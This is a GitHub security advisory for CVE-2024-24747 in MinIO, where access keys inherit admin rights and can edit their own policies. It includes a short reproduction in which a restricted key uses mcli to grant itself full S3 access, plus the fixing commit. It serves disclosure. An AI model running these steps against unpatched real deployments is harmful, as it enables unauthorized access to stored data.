# [H] Minio unsafe default: Access keys inherit `admin` of root user, allowing privilege escalation

## Summary
Severity: High
Advisory: GHSA-xx8w-mq23-29g4
CVE: CVE-2024-24747
CWE: CWE-269
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-02-01
Source: https://github.com/advisories/GHSA-xx8w-mq23-29g4
Type: github-advisory

## Affected
- Go: `github.com/minio/minio` — affected >=0 <0.0.0-20240131185645-0ae4915a9391

## Details
### Summary
When someone creates an access key, it inherits the permissions of the parent key. Not only for 
`s3:*` actions, but also `admin:*` actions. Which means unless somewhere above in the 
access-key hierarchy, the `admin` rights are denied, access keys will be able to simply 
override their own `s3` permissions to something more permissive.

Credit to @xSke for sort of accidentally discovering this. I only understood the implications.

### Details / PoC
We spun up the latest version of minio in a docker container and signed in to the admin UI 
using the minio root user. We created two buckets, `public` and `private` and created an 
access key called `mycat` and attached the following policy to only allow access to the 
bucket called `public`.

```json
{
 "Version": "2012-10-17",
 "Statement": [
  {
   "Effect": "Allow",
   "Action": [
    "s3:*"
   ],
   "Resource": [
    "arn:aws:s3:::public",
    "arn:aws:s3:::public/*"
   ]
  }
 ]
}
```
We then set an alias in mc:  `mcli alias set vuln http://localhost:9001 mycat mycatiscute` 

And checked whether policy works:
```
A ~/c/minio-vuln mcli ls vuln
[0001-01-01 00:53:28 LMT]     0B public/
```
Looks good, we believe this is how 99% of users will work with access policies.

If I now create a file `full-access-policy.json`:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:*"
      ],
      "Resource": [
        "arn:aws:s3:::*"
      ]
    }
  ]
}
```
And then:

```sh
A ~/c/minio-vuln mcli admin user svcacct edit --policy full-access-policy.json vuln mycat
Edited service account `mycat` successfully.
```
`mycat` has escalated its privileges to get access to the entire deployment: 
```sh
A ~/c/minio-vuln mcli ls vuln
[0001-01-01 00:53:28 LMT]     0B private/
[0001-01-01 00:53:28 LMT]     0B public/
```

### Impact
A trivial privilege escalation unless the operator fully understands that they need to 
explicitly deny `admin` actions on access keys. 

### Patched

```
commit 0ae4915a9391ef4b3ec80f5fcdcf24ee6884e776 (HEAD -> master, origin/master)
Author: Aditya Manthramurthy <donatello@users.noreply.github.com>
Date:   Wed Jan 31 10:56:45 2024 -0800

    fix: permission checks for editing access keys (#18928)
    
    With this change, only a user with `UpdateServiceAccountAdminAction`
    permission is able to edit access keys.
    
    We would like to let a user edit their own access keys, however the
    feature needs to be re-designed for better security and integration with
    external systems like AD/LDAP and OpenID.
    
    This change prevents privilege escalation via service accounts.
```

## References
- https://github.com/minio/minio/security/advisories/GHSA-xx8w-mq23-29g4
- https://nvd.nist.gov/vuln/detail/CVE-2024-24747
- https://github.com/minio/minio/commit/0ae4915a9391ef4b3ec80f5fcdcf24ee6884e776
- https://github.com/minio/minio
- https://github.com/minio/minio/releases/tag/RELEASE.2024-01-31T20-20-33Z
